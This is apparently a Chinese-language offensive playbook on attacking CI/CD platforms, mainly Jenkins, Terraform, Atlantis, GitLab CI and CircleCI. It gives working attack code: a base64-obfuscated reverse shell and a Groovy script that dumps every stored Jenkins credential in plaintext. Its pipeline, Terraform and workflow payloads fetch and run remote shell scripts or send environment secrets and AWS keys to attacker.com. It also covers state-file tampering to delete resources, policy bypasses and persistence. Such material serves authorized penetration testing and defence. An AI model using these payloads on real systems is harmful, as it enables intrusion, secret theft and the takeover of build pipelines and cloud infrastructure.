# CI/CD 平台专项攻击技术

本文档覆盖 Jenkins、Terraform、Atlantis、GitLab CI、CircleCI、Serverless Framework、CloudFlare 等 CI/CD 平台的攻击技术细节。

---

## 1. Jenkins

Jenkins 通常以 SYSTEM 权限运行，拥有对所有 Secrets 和构建节点的完全访问权。攻陷 Jenkins 等同于获得整个 CI/CD 流程的控制权。

### 1.1 未认证枚举

在尝试攻击前，先确认可访问的信息面：

| 路径 | 信息 | 是否需要认证 |
|---|---|---|
| `/asynchPeople/` | 用户列表 | 可能无需认证 |
| `/securityRealm/user/admin/search/index?q=` | 用户搜索 | 可能无需认证 |
| `/oops` 或 `/error` | Jenkins 版本号 | 通常无需认证 |
| `/credentials/` | 凭据列表（名称可见） | 需要认证 |
| `/computer/` | 构建节点列表 | 需要认证 |

**登录方式：** 注册（某些实例允许）、SSO（GitHub/Bitbucket 账户）、暴力破解（Jenkins 无密码策略和锁定机制）。

### 1.2 Script Console RCE

最直接的 RCE 路径。访问 `/script`（需要 Admin 或 Script Console 权限）执行 Groovy 脚本：

```groovy
// 命令执行（Linux）
"ls /".execute().text

// 命令执行（Windows）
"cmd.exe /c dir".execute().text

// 完整输出版
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'id'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

Linux 反弹 shell（base64 编码绕过特殊字符）：

```groovy
def proc = 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjE=}|{base64,-d}|{bash,-i}'.execute()
```

### 1.3 Pipeline 创建/修改 → RCE

**创建新 Pipeline：** 在 `/view/all/newJob` 创建 Pipeline 类型项目，在 Pipeline 配置区写入恶意 Groovy：

```groovy
pipeline {
    agent any
    stages {
        stage('RCE') {
            steps {
                sh 'curl https://attacker.com/shell.sh | sh'
            }
        }
    }
}
```

**修改现有 Pipeline：** 如果攻击者对存储 Jenkinsfile 的仓库有写权限，修改 Jenkinsfile 即可在下次构建时执行。无需 Jenkins Web 控制台的访问权限。

### 1.4 Pipeline Sandbox 绕过

Jenkins Pipeline 运行在 Groovy Sandbox 中，但存在多种绕过方式：

- **`@Grab` 注解**：动态下载并加载外部 JAR，可包含任意代码
- **元编程/反射**：通过 Groovy 元编程绕过沙箱白名单
- **Script Approval 钓鱼**：提交需要管理员审批的脚本，利用社工让管理员点击 Approve

### 1.5 凭据转储

**通过 Groovy Script Console 转储所有凭据：**

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.impl.*

def credentialsStore = Jenkins.instance.getExtensionList(
  'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0]?.getStore()

credentialsStore?.getCredentials(
  com.cloudbees.plugins.credentials.domains.Domain.global()
).each {
  if (it instanceof UsernamePasswordCredentialsImpl)
    println "${it.id}: ${it.username} / ${it.password?.getPlainText()}"
  else if (it instanceof org.jenkinsci.plugins.plaincredentials.StringCredentials)
    println "${it.id}: ${it.secret?.getPlainText()}"
  else if (it instanceof com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey)
    println "${it.id}: ${it.privateKeySource?.getPrivateKey()?.getPlainText()}"
}
```

**Pipeline 中加载凭据：**

```groovy
// 不同凭据类型需要不同的加载方式
withCredentials([
  usernamePassword(credentialsId: 'my-cred', usernameVariable: 'USER', passwordVariable: 'PASS'),
  string(credentialsId: 'api-key', variable: 'API_KEY')
]) {
    sh 'env | base64'
}
```

注意：如果凭据类型不匹配（如用 `string()` 加载 `usernamePassword` 类型），会报错暴露凭据类型信息。

### 1.6 离线凭据解密

当获得文件读取能力后（如 LFI 漏洞或服务器 shell），可进行离线凭据解密：

**需要的文件：**
- `$JENKINS_HOME/secrets/master.key`
- `$JENKINS_HOME/secrets/hudson.util.Secret`

**加密凭据位置：**
- `credentials.xml`
- `jobs/*/build.xml`
- `jobs/*/config.xml`

查找加密凭据：`grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"`

离线解密：`python3 jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml`

### 1.7 文件读取 → RCE（Remember Me Cookie 伪造）

当只有文件读取能力时，可通过伪造 Remember Me Cookie 获得 RCE：

1. 读取用户配置：`$JENKINS_HOME/users/*.xml`（获取 username、user seed、password hash）
2. 读取密钥文件：`secret.key`、`secrets/master.key`、`secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac`
3. 解密 MAC Key → 计算 HMAC SHA256 签名 → Base64 编码生成 Cookie
4. 使用伪造的 Cookie + CSRF Token 访问 `/scriptText` 执行 Groovy

### 1.8 FormValidation SSRF

某些 Jenkins 插件暴露 `validateButton` 或 `testConnection` 端点，缺乏权限检查时可被利用：

- 将 POST 请求改为 GET 并去掉 Crumb → 绕过 CSRF
- 替换 URL 参数指向攻击者服务器 → 凭据外泄
- 利用响应错误信息进行端口扫描

---

## 2. Terraform

Terraform 作为 IaC 工具，其配置文件本身就是可执行代码。攻陷 Terraform 等于控制整个云基础设施。

### 2.1 Plan 阶段 RCE

`terraform plan` 是使用频率最高的命令，也是最容易被利用的攻击面。

**external data source（最常用）：**

```hcl
data "external" "rce" {
  program = ["sh", "-c", "curl https://attacker.com/payload.sh | sh"]
}
```

**恶意 Provider：**

```hcl
terraform {
  required_providers {
    evil = {
      source  = "evil/evil"
      version = "1.0"
    }
  }
}
```

Provider 在 `init` 阶段下载，在 `plan` 阶段执行恶意代码。

**隐蔽技术：** 使用外部模块引用隐藏恶意代码，并通过 git ref 指向特定 commit：

```hcl
module "backdoor" {
  source = "git@github.com:attacker/module//modules?ref=b401d2b"
}
```

### 2.2 Apply 阶段 RCE

`local-exec` provisioner 在 `terraform apply` 阶段执行本地命令：

```hcl
resource "null_resource" "rce" {
  provisioner "local-exec" {
    command = "curl https://attacker.com?key=$AWS_ACCESS_KEY_ID&secret=$AWS_SECRET_ACCESS_KEY"
  }
}
```

### 2.3 State 文件攻击

Terraform state 文件包含所有资源的当前状态，且常包含明文密码和密钥：

- **读取 State 文件**：直接获取云资源凭据、数据库密码等
- **篡改 State 文件注入 RCE**：向 `resources` 数组添加恶意 provider 资源，下次 `plan`/`apply` 时触发代码执行
- **删除资源**：向 state 文件插入指向真实资源 ID 的假资源，`apply` 时 Terraform 会删除该资源

### 2.4 Terraform Cloud 攻击

**Token 窃取：** Terraform CLI 在 `~/.terraform.d/credentials.tfrc.json` 中以明文存储 Token。

**Speculative Plan RCE：**

1. 使用窃取的 TFC Token 配置 `cloud` 块指向目标 workspace
2. 使用 `external` data source 触发代码执行
3. 在 TFC Runner 上获取 shell → 读取注入的云凭据文件

**Runner 凭据位置：**

| 云平台 | 文件 | 内容 |
|---|---|---|
| GCP | `tfc-google-application-credentials` | Workload Identity Federation JSON |
| GCP | `tfc-gcp-token` | 短期 GCP 访问 Token |
| AWS | `tfc-aws-shared-config` | OIDC Role Assumption 配置 |
| AWS | `tfc-aws-token` | 短期 AWS Token |

### 2.5 Provider 黑名单绕过

当 `hashicorp/external` 被组织策略禁止时，使用第三方 fork（如 `nazarewk/external`）重新实现相同功能：

```hcl
terraform {
  required_providers {
    external = {
      source  = "nazarewk/external"
      version = "3.0.0"
    }
  }
}
```

---

## 3. Atlantis

Atlantis 是 Terraform 的 PR 自动化平台，通过 PR 评论触发 `plan`/`apply`。Atlantis 服务器上运行着 Terraform，拥有云 Provider 的完整凭据。

### 3.1 Plan 注入 → RCE

任何对仓库有写权限的人都可以创建 PR 并在 `.tf` 文件中注入恶意代码：

```hcl
data "external" "rce" {
  program = ["sh", "-c", "curl https://attacker.com/shell.sh | sh"]
}
```

当 `atlantis plan` 被触发时（可能自动或通过 PR 评论），恶意代码在 Atlantis 服务器上执行。

**隐蔽攻击：** 创建两个分支（test1、test2），从 test1 向 test2 发起 PR。完成攻击后删除 PR 和分支。

### 3.2 Custom Workflow RCE

当服务端配置 `allow_custom_workflows: true` 时，仓库中的 `atlantis.yaml` 可定义任意执行步骤：

```yaml
version: 3
projects:
  - dir: .
    workflow: custom1
workflows:
  custom1:
    plan:
      steps:
        - init
        - run: curl https://attacker.com/shell.sh | sh
```

### 3.3 Secrets 转储

通过 Terraform 的 `output` 结合 `nonsensitive()` 函数在 plan 输出中暴露变量值：

```hcl
output "secret" {
  value = nonsensitive(var.cloud_token)
}
```

### 3.4 Webhook 伪造

如果 Atlantis 未配置 Webhook Secret（或使用 Bitbucket Cloud 不支持 Secret），攻击者可以直接向 Atlantis 发送伪造的 Webhook 请求，触发 plan/apply 命令。

### 3.5 后利用

获得 Atlantis 服务器访问后的关键文件：

| 路径 | 内容 |
|---|---|
| `/home/atlantis/.git-credentials` | VCS 访问凭据 |
| `/atlantis-data/atlantis.db` | VCS 凭据（含更多信息） |
| `/atlantis-data/repos/<org>/<repo>/<pr>/<ws>/<dir>/.terraform/terraform.tfstate` | Terraform State |
| `/proc/1/environ` | 环境变量（含 Provider 凭据） |

---

## 4. GitLab CI

### 4.1 Runner Token 窃取

GitLab Runner 注册 Token 允许注册新的 Runner 并窃取后续分配的所有作业。Token 位置：
- 管理面板 → CI/CD → Runners
- 项目设置 → CI/CD → Runners
- `/etc/gitlab-runner/config.toml`（Runner 服务器上）

### 4.2 共享 Runner 逃逸

GitLab.com 的共享 Runner 运行在容器化环境中，但配置不当的 Self-hosted Runner 可能允许容器逃逸。检查：
- Docker Socket 挂载（`/var/run/docker.sock`）
- 特权模式运行
- 主机网络命名空间

### 4.3 CI 变量注入

GitLab CI 变量按作用域分级：实例级 → 组级 → 项目级。拥有 Maintainer 权限可查看/修改项目级变量。

**Protected 变量绕过：** Protected 变量只在 Protected 分支上可用。如果攻击者能创建 Protected 分支（或目标分支配置了通配符匹配），可以在新分支上访问这些变量。

**利用 `.gitlab-ci.yml`：**

```yaml
stages:
  - exfil
exfil-secrets:
  stage: exfil
  script:
    - env | base64 | curl -X POST -d @- https://attacker.com/collect
```

### 4.4 Executor 风险判断

GitLab Runner 的 executor 决定逃逸和横向价值：

| Executor | 风险点 | 检查 |
|---|---|---|
| Shell | Job 直接以 runner 用户在主机上运行，可读取同机其他项目残留 | `id`, `pwd`, `ls ~/.ssh ~/.docker` |
| Docker | 非特权模式隔离较好；特权模式或挂载 docker.sock 时可容器逃逸 | `ls -la /var/run/docker.sock`, `cat /proc/1/status` |
| SSH | 依赖远程主机执行；弱主机密钥校验可能被中间人攻击 | 检查 runner 配置中的 SSH 参数 |

### 4.5 SCM 后利用与持久化

拿到 GitLab API Token、管理员凭据或足够的用户权限后，优先评估仓库、Runner、PAT 和 SSH Key，而不是只盯着单次 CI Job。

```bash
# 枚举当前 token 可访问项目
curl -s --header "PRIVATE-TOKEN: $TOKEN" "https://gitlab.example.com/api/v4/projects?membership=true"

# 创建 PAT 需要管理员或相应 API 权限；用于授权测试时应设置过期时间并记录清理
curl -k --request POST --header "PRIVATE-TOKEN: $TOKEN" \
  --data "name=audit-token" --data "expires_at=2026-12-31" \
  --data "scopes[]=api" --data "scopes[]=read_repository" \
  "https://gitlab.example.com/api/v4/users/USER_ID/personal_access_tokens"
```

SCMKit / glato 这类工具可自动化 list repo、search code、list runner、create/list/remove PAT、SSH key 管理等动作。使用前要确认目标 SCM 类型、token 权限和授权范围。

---

## 5. CircleCI

### 5.1 Context Secrets 窃取

CircleCI 的 Context 是组织级别的 Secret 容器。默认情况下，组织内所有仓库都可以访问所有 Context。

**攻击前提：** 只需对组织中任意一个仓库拥有写权限。

**窃取 Context Secrets：**

```yaml
version: 2.1
jobs:
  exfil:
    docker:
      - image: cimg/base:stable
    steps:
      - run:
          name: "Exfil"
          command: "curl https://attacker.com/?data=$(env | base64 -w0)"
workflows:
  attack:
    jobs:
      - exfil:
          context: Target-Context
```

### 5.2 项目变量导入

CircleCI 的 "Import Variables" 功能允许从其他项目导入变量。攻击者可以将所有项目的变量导入到自己控制的项目中，一次性窃取。

### 5.3 SSH Rerun

CircleCI 支持通过 SSH 重新运行失败的作业。如果攻击者可以触发构建，SSH Rerun 提供了一个交互式的 shell 环境来探索 Secrets 和网络。

### 5.4 云环境穿越

CircleCI 默认在 GCP 上运行。当目标使用 self-hosted Runner 时（特别是在云环境中），检查：
- 云元数据端点（169.254.169.254）
- VM 实例（`machine: image: ubuntu-2004:current`）比 Docker 容器有更多云权限

---

## 6. Azure DevOps

### 6.1 Pipeline 识别与 PR 触发

Azure Pipelines 常见配置文件是仓库根目录的 `azure-pipelines.yml`。先看 `trigger:` 与 `pr:`，判断是否会构建 PR 或 tag。

```yaml
trigger:
  branches:
    include:
      - master
      - refs/tags/*
pr:
  - master
```

如果 PR 会触发构建，风险评估回到 PPE：是否执行 PR 中的脚本、是否注入变量、是否使用高权限 Service Connection。

### 6.2 Service Connection Secret 提取

Azure DevOps 的高价值凭据通常在 Service Connection 中：AzureRM、GitHub、AWS、SonarQube、SSH 等。攻击路径不是“读取配置文件”本身，而是让 Pipeline 使用对应 service connection 执行可控步骤，从而暴露其环境变量或派生凭据。

```bash
# nord-stream 可用于在授权环境中生成恶意 pipeline 并枚举/提取 CI/CD secret
nord-stream.py devops ... --build-yaml test.yml --build-type ssh
```

使用这类工具前确认项目、组织和 service connection 的授权边界；错误的 build type 会导致只验证到 Pipeline RCE，而没有覆盖目标凭据类型。

### 6.3 参数/变量命令注入

Azure Pipelines 支持 parameters、variables 和模板表达式。若用户可控参数被拼接进 `script` / `bash` / `powershell`，可形成命令注入。优先检查：

- PR 标题、分支名、tag 名是否进入脚本。
- Pipeline 参数是否被未经引用地拼接到 shell。
- 模板复用时是否把不可信仓库的值传入高权限模板。

---

## 7. Drone CI / Buildkite

Drone 和 Buildkite 常用于 self-hosted 场景，因此一次命令执行经常意味着访问组织内网、Kubernetes 或云元数据。

| 平台 | 配置文件 | 命令字段 | 重点风险 |
|---|---|---|---|
| Drone CI | `.drone.yml` | `steps[].commands` | Runner 所在容器/主机权限、Registry token、K8s/cloud 权限 |
| Buildkite | `.buildkite/*.yml` | `steps[].command` | Agent 多为自托管，可能持有部署密钥和内网访问 |

Drone 最小执行形态：

```yaml
steps:
  - name: verify-runner
    image: alpine:3.19
    commands:
      - id
      - hostname
```

Buildkite 最小执行形态：

```yaml
steps:
  - label: "verify runner"
    command: "id && hostname"
```

拿到执行后，优先检查是否为 self-hosted：云元数据、`~/.kube/config`、`/var/run/docker.sock`、`~/.docker/config.json`、部署用 SSH key 和内网路由。

---

## 8. Serverless Framework

### 8.1 部署凭据与 IAM Role 风险

Serverless Framework 部署到 AWS 时会使用本地 AWS 凭据或 Serverless Dashboard 配置的部署身份创建/更新 Lambda、IAM Role、API Gateway 等资源。实际影响取决于部署身份和生成的 Lambda 执行角色权限；不要默认假设执行角色拥有 `AdministratorAccess`。

**Access Key 存储位置：** 本地 `SERVERLESS_ACCESS_KEY` 环境变量或 `serverless` CLI 登录后的本地存储。拿到该 Key 后优先枚举可访问的 org/app/stage 和关联云 Provider 权限，再判断是否可影响目标 AWS 账户。

### 8.2 Plugin 投毒

Serverless Framework 插件通过 npm 安装并在部署生命周期中执行。恶意插件可以：
- 在部署前/后执行任意代码
- 窃取 Provider 凭据
- 修改部署的函数代码

### 8.3 Lambda 环境变量泄露

`serverless.yml` 中通过 SSM/S3 引用的 Secret 在部署时被解析为明文并设置为 Lambda 环境变量。任何有 Lambda 读取权限的人都可以看到这些明文值。

---

## 9. CloudFlare

### 9.1 Workers 滥用

CloudFlare Workers 运行在边缘节点，拥有特殊的网络位置和权限：
- **请求篡改**：Workers 可以修改经过的 HTTP 请求/响应
- **数据外泄**：拦截并转发敏感数据到攻击者服务器
- **Pass-through 代理**：将 Workers 配置为代理进行 IP 轮换

### 9.2 Zero Trust 绕过

CloudFlare Zero Trust（原 Access）配置不当时：
- 服务端未验证 CF-Access-JWT-Assertion 头
- 自定义域名未纳入保护策略
- 内部应用直接暴露到公网

---

## 10. 其他平台快速参照

| 平台 | 关键攻击面 | 核心利用方式 |
|---|---|---|
| **Concourse** | Web UI 默认凭据、Pipeline 变量注入 | 修改 pipeline.yml 注入恶意 task → 窃取 Vault/CredHub 中的凭据 |
| **Apache Airflow** | Web UI 默认密码（airflow/airflow）、DAG 代码执行 | 上传恶意 DAG 文件执行任意 Python 代码；连接配置中存储的数据库/云凭据 |
| **Okta** | SAML/OIDC 配置错误、API Token 泄露 | 窃取 API Token → 创建后门用户/修改 MFA 策略 |
| **Gitea** | 类似 GitHub 的攻击面，自托管更易暴露 | Webhook 无 Secret → 伪造触发；Admin 面板 → 代码执行 |
| **Gitblit** | Java 应用，管理面板暴露 | 默认凭据、仓库操作 API |
| **Travis CI** | `.travis.yml` 修改 | 修改构建脚本窃取加密变量；`travis encrypt` 的密钥泄露 |
| **Vercel** | 环境变量、Serverless Functions | 函数源码泄露、环境变量通过 API 获取 |
| **Supabase** | API Key（anon/service_role）、数据库直连 | `service_role` key 绕过 RLS → 完全数据库访问 |
| **Ansible Tower/AWX** | Credential 存储、Playbook 执行 | 获取 Tower 访问权 → 执行恶意 Playbook → 控制所有受管主机 |
| **Chef** | Knife 配置、Cookbook 篡改 | 修改 Cookbook 注入恶意 Recipe → 在所有节点执行 |
| **Docker Build** | 构建上下文泄露 | 设置构建上下文到仓库根目录以外（如 `..`）→ 在 build 阶段读取宿主机文件 |

---

## 11. 跨平台通用后利用

无论具体 CI/CD 平台，成功获得 Runner/Agent 的代码执行后，以下后利用步骤通用：

### 11.1 凭据搜集优先级

1. **环境变量**：`env | grep -iE 'token|key|secret|password|credential'`
2. **文件系统**：`~/.npmrc`、`.pypirc`、`~/.gem/credentials`、`~/.git-credentials`、`~/.netrc`、`~/.docker/config.json`
3. **代码仓库与片段**：搜索 repo、code、file name、GitLab snippet 中的 `token` / `secret` / `password` / `deploy` / `registry`
4. **云凭据**：`~/.aws/credentials`、`~/.config/gcloud/`、`~/.azure/`
5. **进程内存**：Runner/Worker 进程中的明文 Secrets
6. **元数据服务**：`curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`

SCMKit 可用于授权环境中的 SCM 枚举：`listrepo`、`searchrepo`、`searchcode`、`searchfile`、`listsnippet`。这些动作依赖当前 SCM token 权限，结果应作为 Secret 搜索入口，而不是直接证明可提权。

### 11.2 持久化

- 创建后门 CI/CD 用户或 API Token
- 在隐蔽分支中添加定时触发的恶意 workflow
- 修改现有 Action/Pipeline 中的依赖（如 npm postinstall hook）
- 注册新的 Runner/Agent 用于持续访问

### 11.3 云环境穿越路径

获取到云凭据后的利用请参考：
- AWS 凭据 → 参考 `cloud-aksk-exploit` 技能
- AWS 环境深入 → 参考 `aws-pentesting` 技能
- GCP 环境 → 参考 `gcp-pentesting` 技能
